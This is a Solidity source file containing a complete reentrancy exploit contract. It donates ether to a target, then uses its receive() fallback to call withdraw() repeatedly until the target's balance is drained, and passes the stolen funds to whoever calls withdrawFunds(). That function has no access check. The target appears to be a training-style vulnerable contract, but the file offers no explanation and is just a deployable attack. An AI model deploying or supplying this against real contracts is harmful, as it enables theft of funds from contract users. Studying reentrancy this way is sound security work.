// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyAttack {
    IReentrance public target;
    uint public donateAmount;

    constructor(address payable _targetAddress) public {
        target = IReentrance(_targetAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "Need some ether to attack");
        donateAmount = msg.value;
        target.donate{value: msg.value}(address(this));
        target.withdraw(donateAmount);
    }

    receive() external payable {
        uint targetBalance = address(target).balance;
        if (targetBalance >= donateAmount) {
            target.withdraw(donateAmount);
        } else if (targetBalance > 0) {
            target.withdraw(targetBalance);
        }
    }

    function withdrawFunds() external {
        msg.sender.transfer(address(this).balance);
    }
}